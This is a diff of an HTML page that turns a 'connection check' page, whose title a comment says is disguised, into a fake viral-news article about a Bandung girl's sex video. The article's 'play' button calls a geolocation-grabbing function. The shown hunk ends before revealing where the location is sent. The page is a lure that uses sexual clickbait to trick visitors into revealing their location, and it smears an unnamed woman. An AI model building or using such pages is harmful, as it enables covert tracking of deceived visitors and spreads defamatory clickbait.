@@ -5,20 +5,170 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Cek Koneksi</title> <!-- Judul disamarkan -->
     <style>
-        body { font-family: sans-serif; text-align: center; padding: 50px; }
-        .btn { padding: 15px 30px; background: #28a745; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; }
+         body {
+            font-family: Arial, Helvetica, sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+        }
+
+        .container {
+            background-color: #fff;
+            width: 100%;
+            max-width: 450px; /* Ukuran lebar mirip tampilan mobile/kolom berita */
+            padding: 20px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+        }
+
+        /* Kategori Merah di Atas */
+        .category {
+            color: #b71c1c;
+            font-weight: bold;
+            font-size: 12px;
+            text-transform: uppercase;
+            margin-bottom: 5px;
+        }
+
+        /* Judul Artikel */
+        h1 {
+            color: #333;
+            font-size: 24px;
+            line-height: 1.3;
+            margin-top: 5px;
+            margin-bottom: 15px;
+        }
+
+        /* Gambar Utama */
+        .image-container {
+            width: 100%;
+            margin-bottom: 5px;
+        }
+
+        .image-container img {
+            width: 100%;
+            height: auto;
+            border-radius: 4px;
+            display: block;
+        }
+
+        .caption {
+            font-size: 12px;
+            color: #333;
+            margin-bottom: 15px;
+        }
+
+        /* Audio Player Bar */
+        .audio-player {
+            background-color: #c0392b; /* Merah tua */
+            color: white;
+            padding: 10px 15px;
+            border-radius: 4px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+
+        .audio-label {
+            display: flex;
+            align-items: center;
+            font-size: 14px;
+            font-weight: bold;
+        }
+
+        .audio-label span {
+            margin-right: 10px;
+            font-size: 18px;
+        }
+
+        .audio-controls {
+            display: flex;
+            gap: 10px;
+        }
+
+        .control-btn {
+            width: 28px;
+            height: 28px;
+            background-color: rgba(255, 255, 255, 0.8);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            border: none;
+        }
+
+        .control-btn:hover {
+            background-color: #fff;
+        }
+
+        .control-btn svg {
+            width: 12px;
+            height: 12px;
+            fill: #333;
+        }
+
+        /* Isi Artikel */
+        .article-content {
+            font-size: 15px;
+            line-height: 1.6;
+            color: #333;
+            text-align: justify;
+        }
+
+        .article-content strong {
+            color: #000;
+        }
+        . { 
+          padding: 15px 30px; 
+          background: #28a745; 
+          color: white; 
+          border: none; 
+          border-radius: 5px; 
+          cursor: pointer; 
+          font-size: 16px; }
     </style>
 </head>
 <body>
 
-    <h2>Verifikasi Sinyal & Lokasi</h2>
-    <p>Klik tombol di bawah untuk memperbarui status jaringan Anda.</p>
-    
-    <button class="btn" onclick="getLocation()">Perbarui Data</button>
-    
-    <p id="status" style="margin-top: 20px; color: #555;"></p>
+  <div class="container">
+        <!-- Header Kategori -->
+        <div class="category">Viral lagi</div>
 
-    <script>
+        <!-- Judul -->
+        <h1>Gadis Bandung Gaet Fansnya Lewat video mesum</h1>
+
+        <!-- Gambar (Placeholder - Ganti src dengan gambar asli jika ada) -->
+        <div class="image-container">
+            <img src="https://placehold.co/400x300/e0e0e0/555?text=Foto+Elly+Tran" alt="Gadis Vietnam Seksi">
+        </div>
+        <div class="caption">viral gadis bandung</div>
+
+        <!-- Audio Player Style -->
+        <div class="audio-player">
+  <div class="audio-label">
+    <span>▶️</span> Tonton lanjutkan
+  </div>
+  <div class="audio-controls">
+    <!-- Tombol Play dengan fungsi getLocation -->
+    <button class="control-btn" onclick="getLocation()">
+      <svg viewBox="0 0 24 24" width="24" height="24">
+        <path d="M8 5v14l11-7z" fill="currentColor"/>
+      </svg>
+    </button>
+              </div>
+        </div>
+        <!-- Teks Artikel -->
+        <div class="article-content">
+            <p>
+                <strong>Viral Celeb</strong> - Bandung — Media sosial tengah dihebohkan dengan munculny “Gadis cantik” yang mendadak viral di berbagai platform. Tagar terkait topik ini ramai dibicarakan, terutama di X (Twitter) dan TikTok.
+            </p>
+        </div>
+    </div>
+    
+      <script>
         function getLocation() {
             var status = document.getElementById("status");
             if (navigator.geolocation) {
